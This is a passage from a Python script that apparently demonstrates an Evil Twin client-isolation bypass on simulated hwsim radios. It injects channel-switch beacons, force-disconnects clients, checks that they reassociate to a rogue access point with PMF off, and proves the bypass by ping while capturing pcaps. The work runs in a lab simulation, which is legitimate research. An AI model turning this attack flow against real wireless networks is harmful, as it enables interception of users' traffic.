                    fallback_disconnect_used=fallback_disconnect_used,
                )
        else:
            log("Force-disconnect clients to model physical channel separation after CSA.")
            for client in CLIENTS:
                client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
            time.sleep(2)

        log("\n=== POST-CSA MONITORING ===")
        log("Waiting for both clients to reassociate to Evil Twin...")
        evil_associated, evil_assoc_results, evil_assoc_elapsed = check_all_associated(
            CLIENTS,
            timeout=args.evil_wait,
            expected_bssid=evil_mac,
        )

        stop_tcpdump(csa_proc, "CSA_REASSOC")
        csa_pcap = copy_pcap(csa_tmp, csa_final) if csa_proc else None
        if csa_pcap:
            artifacts.append(csa_pcap)

        if evil_associated:
            evil_result = "EVIL_TWIN_REASSOC_PASS"
            log("EVIL_TWIN_REASSOC_PASS: both clients reassociated to Evil Twin.")
        else:
            if args.wmediumd_loss_after_csa and args.wmediumd_fallback_disconnect:
                log("wmediumd-loss did not trigger roam; applying explicit fallback disconnect.")
                for client in CLIENTS:
                    client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
                fallback_disconnect_used = True
                time.sleep(2)
                evil_associated, evil_assoc_results, evil_assoc_elapsed = check_all_associated(
                    CLIENTS,
                    timeout=args.evil_wait,
                    expected_bssid=evil_mac,
                )
                if evil_associated:
                    evil_result = "EVIL_TWIN_REASSOC_PASS"
                    log("EVIL_TWIN_REASSOC_PASS: fallback disconnect moved clients to Evil Twin.")

        if not evil_associated:
            evil_result = "EVIL_TWIN_REASSOC_FAIL"
            if args.wmediumd_loss_after_csa:
                log("WMEDIUMD_LOSS_NO_ROAM: link loss applied, but clients did not reassociate automatically.")
                result = "WMEDIUMD_LOSS_NO_ROAM"
            else:
                log("EVIL_TWIN_REASSOC_FAIL: not all clients reached Evil Twin.")
                result = "EVIL_TWIN_REASSOC_FAIL"
            for client in CLIENTS:
                status = evil_assoc_results[client.name]
                log(f"  {client.name}: associated={status['associated']} bssid={status['bssid']} freq={status['freq']}")
            return save_and_return(
                args,
                result,
                evil_result,
                artifacts,
                assoc_elapsed,
                burst_count,
                switch_elapsed,
                attempt_started,
                1,
                wmediumd_mode=wmediumd_mode,
                wmediumd_update_result=wmediumd_update_result,
                fallback_disconnect_used=fallback_disconnect_used,
            )

        assign_client_ips(CLIENTS)
        evil_ping_ok, _, _, evil_ping_pcap = run_ping_phase(
            "EVIL_TWIN_PING",
            CLIENTS[0],
            CLIENTS[1],
            expect_success=True,
            capture_iface=IFACE_EVIL,
            ts_str=ts_str,
            capture_enabled=args.capture_ping,
        )
        if evil_ping_pcap:
            artifacts.append(evil_ping_pcap)

        if evil_ping_ok:
            result = "SUCCESS"
            log("SUCCESS: isolation bypass shown. Clients cannot ping on legit AP, then can ping on Evil Twin.")
            exit_code = 0
        else:
            result = "EVIL_TWIN_PING_FAIL"
            log("EVIL_TWIN_PING_FAIL: clients reached Evil Twin but ping proof failed.")
            exit_code = 1

        log(f"Evil reassociation seconds: {evil_assoc_elapsed:.1f}")
        stop_process(evil_proc, "Evil Twin hostapd")
        return save_and_return(
            args,
            result,
            evil_result,
            artifacts,
            assoc_elapsed,
            burst_count,
            switch_elapsed,
            attempt_started,
            exit_code,
            wmediumd_mode=wmediumd_mode,
            wmediumd_update_result=wmediumd_update_result,
            fallback_disconnect_used=fallback_disconnect_used,
        )

    except Exception as e:
        log(f"ERROR: {e}")
        import traceback
        traceback.print_exc()
        return {"exit_code": 2, "result": "ERROR", "attempt_elapsed": time.monotonic() - attempt_started}
    finally:
        cleanup()


def save_and_return(
    args,
    result,
    evil_result,
    artifacts,
    assoc_elapsed,
    burst_count,
    switch_elapsed,
    attempt_started,
    exit_code,
    wmediumd_mode="off",
    wmediumd_update_result="SKIPPED",
    fallback_disconnect_used=False,
):
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_path = LOG_DIR / f"direct_csa_{args.hostapd_ver}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(log_path, "w") as f:
        f.write("Test: Direct hwsim Evil Twin Isolation Bypass\n")
        f.write(f"hostapd: {args.hostapd_ver}\n")
        f.write(f"Legit AP PMF: {args.pmf}\n")
        f.write(f"STA PMF: {args.sta_pmf}\n")
        f.write(f"Evil AP PMF: {args.evil_pmf}\n")
        f.write(f"Clients: {args.clients}\n")
        f.write(f"Radios: {args.radios}\n")
        f.write(f"Demo isolation: {args.demo_isolation}\n")
        f.write(f"Capture ping: {args.capture_ping}\n")
        f.write(f"Wmediumd mode: {wmediumd_mode}\n")
        f.write(f"Wmediumd update result: {wmediumd_update_result}\n")
        f.write(f"Fallback disconnect used: {fallback_disconnect_used}\n")
        f.write(f"Legit channel: {LEGIT_CHANNEL}\n")
        f.write(f"Evil channel: {args.evil_channel}\n")
        f.write(f"Beacon count: {args.beacon_count}\n")
        f.write(f"Result: {result}\n")
        f.write(f"Evil Twin: {evil_result}\n")
        f.write(f"Association seconds: {assoc_elapsed:.1f}\n")
        f.write(f"CSA bursts used: {burst_count}\n")
        if switch_elapsed is None:
            f.write("Switch seconds: NONE\n")
        else:
            f.write(f"Switch seconds: {switch_elapsed:.1f}\n")
        f.write(f"Attempt seconds: {time.monotonic() - attempt_started:.1f}\n")
        for artifact in artifacts:
            f.write(f"PCAP: {artifact}\n")
    log(f"Log saved: {log_path}")
    return {
        "exit_code": exit_code,
        "result": result,
        "log_path": str(log_path),
        "evil_result": evil_result,
        "artifacts": artifacts,
        "burst_count": burst_count,
        "switch_elapsed": switch_elapsed,
        "assoc_elapsed": assoc_elapsed,
        "wmediumd_mode": wmediumd_mode,
        "wmediumd_update_result": wmediumd_update_result,
        "fallback_disconnect_used": fallback_disconnect_used,
        "attempt_elapsed": time.monotonic() - attempt_started,
    }


def parse_args():
    parser = argparse.ArgumentParser(
        description="Direct hwsim Evil Twin client-isolation bypass demo (no Mininet-WiFi)"
    )
    parser.add_argument("--hostapd-ver", default="2.10", choices=["2.6", "2.10"],
                        help="hostapd version (default: 2.10)")
    parser.add_argument("--evil-channel", type=int, default=EVIL_CHANNEL,
                        help=f"Target channel for CSA (default: {EVIL_CHANNEL})")
    parser.add_argument("--beacon-count", type=int, default=30,
                        help="Number of Beacon CSA frames to inject per burst")
    parser.add_argument("--no-wmediumd", action="store_true",
                        help="Skip wmediumd (default wrapper does this for hwsim stability)")
    parser.add_argument("--wmediumd-loss-after-csa", action="store_true",
                        help="Experimental: use wmediumd server errprob updates instead of force-disconnect after CSA")
    parser.add_argument("--wmediumd-fallback-disconnect", action="store_true",
                        help="With --wmediumd-loss-after-csa, fall back to explicit disconnect if clients do not roam")
    parser.add_argument("--pmf", type=int, default=2, choices=[0, 1, 2],
                        help="Legitimate AP PMF mode: 0=disabled, 1=optional, 2=required")
    parser.add_argument("--sta-pmf", type=int, default=1, choices=[0, 1, 2],
                        help="Client PMF mode. Default 1 supports PMF on legit AP but can join PMF-off Evil Twin.")
    parser.add_argument("--evil-pmf", type=int, default=0, choices=[0, 1, 2],
                        help="Evil Twin PMF mode (default: 0)")
    parser.add_argument("--wait", type=int, default=15,
                        help="Seconds to poll after each CSA burst for channel switch")
    parser.add_argument("--evil-wait", type=int, default=30,
                        help="Seconds to wait for Evil Twin reassociation")
    parser.add_argument("--retries", type=int, default=2,
                        help="Retry timing-sensitive failed/BLOCKED runs (default: 2)")
    parser.add_argument("--until-success", action="store_true",
                        help="Retry attempts until SUCCESS or Ctrl+C")
    parser.add_argument("--csa-bursts", type=int, default=3,
                        help="CSA burst rounds per attempt before marking blocked")
    parser.add_argument("--poll-interval", type=float, default=1.0,
                        help="Seconds between channel polls during CSA wait")
    parser.add_argument("--burst-gap", type=float, default=1.0,
                        help="Seconds to wait between CSA bursts")
    parser.add_argument("--clients", type=int, default=2,
                        help="Number of client stations to create (default: 2)")
    parser.add_argument("--radios", type=int, default=6,
                        help="Number of hwsim radios to load (default: 6; use >= clients+4 for separate capture radio)")
    parser.add_argument("--demo-isolation", dest="demo_isolation", action="store_true", default=True,
                        help="Run baseline client-isolation ping proof before CSA (default: enabled)")
    parser.add_argument("--no-demo-isolation", dest="demo_isolation", action="store_false",
                        help="Skip baseline client-isolation ping proof")
    parser.add_argument("--capture-ping", dest="capture_ping", action="store_true", default=True,
                        help="Capture baseline and Evil Twin ping traffic with tcpdump (default: enabled)")
    parser.add_argument("--no-capture-ping", dest="capture_ping", action="store_false",
                        help="Run ping proofs without ping PCAP capture")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.wmediumd_loss_after_csa and args.no_wmediumd:
        log("wmediumd-loss-after-csa requested; enabling wmediumd despite --no-wmediumd.")
        args.no_wmediumd = False
    if args.clients < 2:
        log("ERROR: this demo needs at least two clients for ping proof. Use --clients 2.")
        return 2
    min_radios = args.clients + 3
    if args.radios < min_radios:
        log(f"ERROR: --radios must be at least {min_radios} for {args.clients} clients.")
        return 2

    max_attempts = "infinity" if args.until_success else max(1, args.retries + 1)
    final = None
    attempt_no = 1
    try:
        while True:
            final = run_attempt(args, attempt_no, max_attempts)
            if final["result"] == "SUCCESS":
                return 0

            retryable = final["result"] in {
                "CSA_SWITCH_FAIL",
                "EVIL_TWIN_REASSOC_FAIL",
                "EVIL_TWIN_PING_FAIL",
                "NO_ASSOC",
                "ERROR",
            }
            attempts_left = args.until_success or attempt_no < max_attempts
            if retryable and attempts_left:
                log(f"Retrying scenario after {final['result']} (timing issue likely)...")
                time.sleep(2)
                attempt_no += 1
                continue
            break
    except KeyboardInterrupt:
        log("Interrupted by user; cleanup already handled by current attempt.")
        return 130

    return final["exit_code"] if final else 2


if __name__ == "__main__":
    sys.exit(main())
